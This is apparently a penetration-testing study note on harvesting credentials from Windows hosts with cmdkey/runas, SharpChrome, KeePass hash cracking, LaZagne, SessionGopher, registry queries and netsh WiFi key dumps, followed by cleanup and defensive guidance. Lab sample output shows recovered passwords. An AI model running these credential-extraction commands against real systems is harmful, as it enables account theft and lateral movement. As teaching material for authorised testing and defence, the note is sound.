## Overview

Windows systems can store credentials in many places beyond obvious files and scripts.

Useful credential sources include:

- `cmdkey` saved credentials
- browser saved logins
- browser cookies
- password manager databases
- email inboxes
- remote access tool profiles
- cleartext registry values
- Windows AutoLogon settings
- PuTTY proxy credentials
- saved WiFi profiles

Discovered credentials may support:

- local privilege escalation
- lateral movement
- domain access
- access to administrative portals
- access to databases, network devices, or cloud services

> [!important]
> Credential hunting should be performed carefully and only within the assessment scope. Treat all discovered credentials as sensitive evidence.

---

# Method 1 – Cmdkey Saved Credentials

## Why Cmdkey Matters

`cmdkey` can create, list, and delete stored usernames and passwords.

Users may save credentials for:

- Remote Desktop connections
- terminal services
- file shares
- specific remote hosts
- convenience-based authentication

Saved credentials may allow reuse through RDP or `runas`.

---

# List Saved Credentials

```cmd
cmdkey /list
```

Example output:

```cmd
C:\htb> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
```

Interesting target:

```text
TERMSRV/SQL01
```

Saved user:

```text
inlanefreight\bob
```

This indicates stored credentials for RDP or terminal services to `SQL01`.

---

# Reuse Saved Credentials with RDP

When connecting to the saved target, Windows may automatically use the stored credentials.

Example target:

```text
SQL01
```

Example user:

```text
inlanefreight\bob
```

---

# Reuse Saved Credentials with runas

Use `runas /savecred` to execute a command as the saved user.

```powershell
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

Possible uses:

- launch a command prompt
- launch PowerShell
- execute a binary
- run a script
- trigger a callback
- access a resource as the saved user

Example pattern:

```powershell
runas /savecred /user:inlanefreight\bob "powershell.exe"
```

> [!note]
> `runas /savecred` uses credentials already stored for that user context. It does not reveal the cleartext password.

---

# Method 2 – Browser Credentials

## Why Browser Credentials Matter

Users often save credentials in browsers for frequently accessed applications.

Potentially valuable browser-stored targets:

- internal web portals
- vCenter
- helpdesk tools
- VPN portals
- password managers
- admin panels
- intranet applications
- SaaS applications

---

# Retrieve Chrome Saved Logins with SharpChrome

`SharpChrome` can retrieve Chrome cookies and saved logins.

```powershell
.\SharpChrome.exe logins /unprotect
```

Example output:

```powershell
PS C:\htb> .\SharpChrome.exe logins /unprotect

[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user

[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0

--- Chrome Credential (Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@inlanefreight.local,Welcome1
```

Recovered credential:

```text
Target: https://vc01.inlanefreight.local/ui
User: bob@inlanefreight.local
Password: Welcome1
```

---

# Browser Credential Collection Telemetry

Browser credential collection can generate events that defenders may detect.

Potential event sources:

| Event / Source | Relevance |
|---|---|
| `4688` | Process creation |
| `16385` | DPAPI activity |
| `4662` | Object access |
| `4663` | File access |

Potential file targets:

```text
Chrome\User Data\Local State
Chrome\User Data\Default\Login Data
```

> [!warning]
> Browser credential extraction is noisy and sensitive. Use only when approved and document access carefully.

---

# Method 3 – Password Managers

## Why Password Managers Matter

Password managers can provide access to many high-value systems from one location.

Common password manager types:

- desktop password managers, such as KeePass
- cloud password managers, such as 1Password
- enterprise vaults, such as Thycotic or CyberArk

Compromising a password manager used by IT staff may expose credentials for:

- servers
- network devices
- databases
- hypervisors
- domain accounts
- cloud platforms
- privileged applications

---

# KeePass Databases

KeePass database files usually use the extension:

```text
.kdbx
```

A KeePass database is commonly protected by:

- master password
- key file
- Windows user account integration
- combinations of the above

If the database only uses a weak master password, it may be crackable offline.

---

# Extract KeePass Hash

Use `keepass2john.py` to extract a hash from the `.kdbx` file.

```bash
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
```

Example output:

```text
ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154
```

Save the hash to a file:

```text
keepass_hash
```

---

# Crack KeePass Hash Offline

Use Hashcat mode `13400`.

```bash
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

Example cracked result:

```text
$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154:panther1
```

Recovered master password:

```text
panther1
```

---

# KeePass Attack Flow

1. Find `.kdbx` file.
2. Copy it to the attack host.
3. Extract hash with `keepass2john.py`.
4. Crack hash with Hashcat or John.
5. Open the database with the recovered password.
6. Triage entries for high-value systems.
7. Validate credentials only within scope.

---

# Method 4 – Email Credential Hunting

## Why Email Matters

If a domain user has access to a Microsoft Exchange mailbox, email may contain credentials or sensitive operational information.

Search terms:

```text
pass
password
creds
credentials
vpn
admin
temporary
reset
service account
MFA
token
secret
```

Tools such as `MailSniper` can search mailboxes for credential-related terms.

Potential findings:

- onboarding passwords
- password reset emails
- service account details
- VPN instructions
- internal hostnames
- administrative portal URLs
- password manager invitations

---

# Method 5 – LaZagne

## Why LaZagne Matters

`LaZagne` attempts to retrieve credentials from many supported applications and Windows storage locations.

Supported categories include:

- browsers
- chat clients
- databases
- email clients
- memory
- WiFi
- sysadmin tools
- Git
- SVN
- Windows credential storage
- DPAPI
- LSA secrets
- Autologon
- Credman

---

# View LaZagne Help

```powershell
.\lazagne.exe -h
```

Example output:

```text
usage: lazagne.exe [-h] [-version]
                   {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                   ...

positional arguments:
  {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                        Choose a main command
    chats               Run chats module
    mails               Run mails module
    all                 Run all modules
    git                 Run git module
    svn                 Run svn module
    windows             Run windows module
    wifi                Run wifi module
    maven               Run maven module
    sysadmin            Run sysadmin module
    browsers            Run browsers module
    games               Run games module
    multimedia          Run multimedia module
    memory              Run memory module
    databases           Run databases module
    php                 Run php module

optional arguments:
  -h, --help            show this help message and exit
  -version              laZagne version
```

---

# Run All LaZagne Modules

```powershell
.\lazagne.exe all
```

Example output:

```text
########## User: jordan ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Credman passwords -----------------

[+] Password found !!!
URL: dev01.dev.inlanefreight.local
Login: jordan_adm
Password: ! Q A Z z a q 1

[+] 2 passwords have been found.

For more information launch it again with the -v option

elapsed time = 5.50499987602
```

Recovered credentials:

```text
WinSCP:
transfer.inlanefreight.local
root
Summer2020!

Credman:
dev01.dev.inlanefreight.local
jordan_adm
! Q A Z z a q 1
```

> [!warning]
> LaZagne can be heavily detected by endpoint security tools. Use only with explicit authorization.

---

# Method 6 – SessionGopher

## Why SessionGopher Matters

`SessionGopher` extracts saved session information from common remote access tools.

Targets include:

- PuTTY
- WinSCP
- FileZilla
- SuperPuTTY
- RDP

It can also search drives for:

```text
.ppk
.rdp
.sdtid
```

SessionGopher searches the `HKEY_USERS` hive for users who have logged into the host and attempts to decrypt saved session information.

> [!note]
> Local admin access is needed to retrieve stored session information for every user in `HKEY_USERS`, but it is still worth running as the current user.

---

# Run SessionGopher as Current User

```powershell
Import-Module .\SessionGopher.ps1
```

```powershell
Invoke-SessionGopher -Target WINLPE-SRV01
```

Example output:

```powershell
PS C:\htb> Import-Module .\SessionGopher.ps1

PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01

[+] Digging on WINLPE-SRV01...

WinSCP Sessions

Source   : WINLPE-SRV01\htb-student
Session  : Default%20Settings
Hostname :
Username :
Password :

PuTTY Sessions

Source   : WINLPE-SRV01\htb-student
Session  : nix03
Hostname : nix03.inlanefreight.local

SuperPuTTY Sessions

Source        : WINLPE-SRV01\htb-student
SessionId     : NIX03
SessionName   : NIX03
Host          : nix03.inlanefreight.local
Username      : srvadmin
ExtraArgs     :
Port          : 22
Putty Session : Default Settings
```

Interesting target:

```text
nix03.inlanefreight.local
```

Interesting username:

```text
srvadmin
```

---

# Method 7 – Cleartext Passwords in the Registry

## Why Registry Secrets Matter

Some Windows configurations and third-party applications store sensitive values in the registry.

Tools can extract many of these automatically, but manual registry enumeration is important.

Common locations include:

- AutoLogon configuration
- PuTTY sessions
- saved proxy credentials
- application settings
- remote access tool profiles
- service configuration values

---

# Windows AutoLogon

## Overview

Windows AutoLogon allows a system to automatically log in to a specific user account at startup.

When configured manually, the username and password may be stored in cleartext in the registry.

Registry path:

```text
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

This key can often be read by standard users.

---

# AutoLogon Registry Values

| Value | Meaning |
|---|---|
| `AutoAdminLogon` | `1` means AutoLogon is enabled |
| `DefaultUserName` | Username used for automatic logon |
| `DefaultPassword` | Cleartext password for the configured account |

---

# Enumerate AutoLogon with reg.exe

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Example output:

```cmd
C:\htb> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0

    <SNIP>

    AutoAdminLogon    REG_SZ    1
    DefaultUserName   REG_SZ    htb-student
    DefaultPassword   REG_SZ    HTB_@cademy_stdnt!
```

Recovered credential:

```text
User: htb-student
Password: HTB_@cademy_stdnt!
```

> [!tip]
> If AutoLogon is required, Sysinternals `Autologon.exe` stores the password as an LSA secret instead of directly in the `Winlogon` key.

---

# PuTTY Registry Credentials

## Why PuTTY Matters

PuTTY stores saved session configuration in the registry.

For sessions using a proxy connection, saved proxy credentials may be stored in cleartext.

Current user path:

```text
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

Admin view for other users:

```text
HKEY_USERS\<USER_SID>\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

Access is tied to the user that created the session. To read `HKCU` values, run as that user. With local admin access, inspect corresponding hives under `HKEY_USERS`.

---

# Enumerate PuTTY Sessions

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

Example output:

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

Saved session:

```text
kali%20ssh
```

---

# Inspect PuTTY Session Values

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

Example output:

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present          REG_DWORD    0x1
    HostName         REG_SZ
    LogFileName      REG_SZ       putty.log

  <SNIP>

    ProxyDNS         REG_DWORD    0x1
    ProxyLocalhost   REG_DWORD    0x0
    ProxyMethod      REG_DWORD    0x5
    ProxyHost        REG_SZ       proxy
    ProxyPort        REG_DWORD    0x50
    ProxyUsername    REG_SZ       administrator
    ProxyPassword    REG_SZ       1_4m_th3_@cademy_4dm1n!
```

Recovered proxy credential:

```text
ProxyUsername: administrator
ProxyPassword: 1_4m_th3_@cademy_4dm1n!
```

Possible impact:

- proxy access
- password reuse against hosts
- local admin reuse
- domain account reuse
- access to SSH targets

---

# Method 8 – WiFi Passwords

## When WiFi Passwords Matter

If local admin access is obtained on a workstation with a wireless card, saved wireless profiles can reveal pre-shared keys.

This may allow access to:

- corporate WiFi
- guest WiFi
- isolated wireless networks
- mobile hotspot networks
- network segments not reachable from the current host

---

# View Saved Wireless Profiles

```cmd
netsh wlan show profile
```

Example output:

```cmd
C:\htb> netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
    All User Profile     : Smith Cabin
    All User Profile     : Bob's iPhone
    All User Profile     : EE_Guest
    All User Profile     : EE_Guest 2.4
    All User Profile     : ilfreight_corp
```

Interesting profile:

```text
ilfreight_corp
```

---

# Retrieve Saved Wireless Password

```cmd
netsh wlan show profile ilfreight_corp key=clear
```

Example output:

```cmd
C:\htb> netsh wlan show profile ilfreight_corp key=clear

Profile ilfreight_corp on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : ilfreight_corp
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "ilfreight_corp"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension       : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : ILFREIGHTWIFI-CORP123908!

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default
```

Recovered WiFi key:

```text
ILFREIGHTWIFI-CORP123908!
```

---

# Practical Decision Tree

## Are saved Windows credentials present?

Check:

```cmd
cmdkey /list
```

If a useful target exists, attempt access through the intended protocol or use:

```powershell
runas /savecred /user:<domain\user> "<command>"
```

---

## Are browser credentials in scope?

For Chrome:

```powershell
.\SharpChrome.exe logins /unprotect
```

Prioritize:

- admin portals
- vCenter
- VPN portals
- helpdesk systems
- password manager web vaults

---

## Are password manager files present?

Search for KeePass databases:

```powershell
Get-ChildItem C:\ -Recurse -Include *.kdbx -ErrorAction SilentlyContinue
```

If found, extract and crack:

```bash
python2.7 keepass2john.py <database.kdbx>
hashcat -m 13400 <hash_file> <wordlist>
```

---

## Is email accessible?

Search for:

```text
pass
creds
credentials
password reset
vpn
admin
```

Use tooling such as MailSniper only when allowed.

---

## Are broad credential dumping tools allowed?

If approved, run LaZagne:

```powershell
.\lazagne.exe all
```

Run targeted modules where possible to reduce noise.

---

## Are remote access tool sessions saved?

Use SessionGopher:

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target <host>
```

Check for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP entries.

---

## Are cleartext registry secrets present?

Check AutoLogon:

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Check PuTTY sessions:

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

---

## Is local admin available on a WiFi workstation?

List profiles:

```cmd
netsh wlan show profile
```

Retrieve keys:

```cmd
netsh wlan show profile <profile_name> key=clear
```

---

# Troubleshooting

## `cmdkey /list` shows credentials but runas fails

Possible causes:

- credential is tied to a specific target
- current context cannot use the stored credential
- command syntax issue
- UAC or desktop interaction issue
- saved credential is stale
- target account is disabled or password changed

---

## SharpChrome does not retrieve passwords

Possible causes:

- wrong user context
- Chrome profile locked
- DPAPI decryption failed
- Chrome version behavior changed
- endpoint protection blocked access
- credentials stored in a different profile
- browser was not used to save logins

---

## KeePass cracking fails

Possible causes:

- strong master password
- key file required
- Windows account integration required
- wrong Hashcat mode
- corrupted `.kdbx`
- weak wordlist/rules

---

## LaZagne returns nothing

Possible causes:

- no supported software
- wrong user context
- insufficient permissions
- credentials protected by DPAPI for another user
- endpoint protection blocked modules
- running from restricted shell

---

## SessionGopher returns empty results

Possible causes:

- no saved sessions
- wrong target
- not running as the relevant user
- local admin required for other users
- remote registry access unavailable
- tool blocked by execution policy or endpoint protection

---

## PuTTY registry key not found

Possible causes:

- PuTTY not used
- sessions not saved
- current user did not create the sessions
- installed fork stores settings elsewhere
- need to inspect `HKEY_USERS` with admin rights

---

## WiFi key is not shown

Possible causes:

- no wireless adapter
- no saved profiles
- not running with sufficient privileges
- profile is managed by Group Policy
- key material is unavailable
- using enterprise authentication instead of WPA2-Personal

---

# Command Reference

## List saved credentials

```cmd
cmdkey /list
```

## Run command with saved credentials

```powershell
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

## Retrieve Chrome saved logins

```powershell
.\SharpChrome.exe logins /unprotect
```

## Search for KeePass databases

```powershell
Get-ChildItem C:\ -Recurse -Include *.kdbx -ErrorAction SilentlyContinue
```

## Extract KeePass hash

```bash
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
```

## Crack KeePass hash with Hashcat

```bash
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

## View LaZagne help

```powershell
.\lazagne.exe -h
```

## Run all LaZagne modules

```powershell
.\lazagne.exe all
```

## Import SessionGopher

```powershell
Import-Module .\SessionGopher.ps1
```

## Run SessionGopher

```powershell
Invoke-SessionGopher -Target WINLPE-SRV01
```

## Query AutoLogon registry key

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## Query PuTTY saved sessions

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

## Query a PuTTY session

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION_NAME>
```

## List saved WiFi profiles

```cmd
netsh wlan show profile
```

## Retrieve saved WiFi profile key

```cmd
netsh wlan show profile <profile_name> key=clear
```

---

# Cleanup Checklist

Remove temporary files and tool output:

```text
SharpChrome output
LaZagne output
SessionGopher output
KeePass hashes
copied .kdbx files
browser database copies
temporary credential notes
```

If account or command execution changes were made through recovered credentials, document and revert them where applicable.

Credential handling:

- minimize cleartext exposure in reports
- store only in approved locations
- avoid leaving credentials on target hosts
- recommend rotation for recovered credentials
- include exact source path or registry key
- document validation attempts

---

# Defensive Notes

## Common Causes

Credentials are exposed through:

- saved RDP credentials
- browser password storage
- weak password manager master passwords
- cleartext AutoLogon configuration
- PuTTY proxy credential storage
- saved remote access tool sessions
- WPA2-Personal WiFi profiles
- overuse of local administrator rights
- password reuse

---

## Defensive Controls

Organizations should:

- disable or restrict saved credentials where possible
- avoid browser password storage for privileged accounts
- enforce enterprise password manager policies
- require strong master passwords and MFA for vaults
- prevent storage of AutoLogon passwords in cleartext
- use Sysinternals Autologon if AutoLogon is unavoidable
- audit PuTTY and remote access tool saved sessions
- rotate credentials found in registry or tools
- monitor DPAPI access and browser credential file access
- use unique passwords for local, domain, service, and WiFi accounts
- prefer WPA2/WPA3-Enterprise over shared WiFi passwords

---

# Key Takeaways

- `cmdkey /list` can reveal saved credentials for RDP or remote targets.
- `runas /savecred` can execute commands using stored credentials without revealing the password.
- Browser saved credentials can expose high-value application access.
- Chrome credential extraction may generate process, DPAPI, and file access telemetry.
- KeePass `.kdbx` files can be cracked offline if protected by a weak master password.
- Email often contains credentials, password reset data, or internal system information.
- LaZagne can extract credentials from many supported applications and Windows stores.
- SessionGopher is useful for saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP data.
- AutoLogon can store cleartext credentials under the `Winlogon` registry key.
- PuTTY proxy credentials may be stored in cleartext under the current user registry hive.
- Saved WiFi profiles may reveal pre-shared keys when local admin access is available.

---

# Related Notes

- [[Windows Privilege Escalation]]
- [[Credential Hunting]]
- [[Cmdkey]]
- [[Runas]]
- [[Chrome Credentials]]
- [[SharpChrome]]
- [[KeePass]]
- [[Hashcat]]
- [[LaZagne]]
- [[SessionGopher]]
- [[DPAPI]]
- [[Windows Registry]]
- [[AutoLogon]]
- [[PuTTY]]
- [[WiFi Passwords]]
- [[MailSniper]]

---

# Tags

#windows
#privilege-escalation
#credential-hunting
#cmdkey
#runas
#browser-credentials
#sharpchrome
#keepass
#hashcat
#lazagne
#sessiongopher
#registry-secrets
#autologon
#putty
#wifi-passwords
#pentesting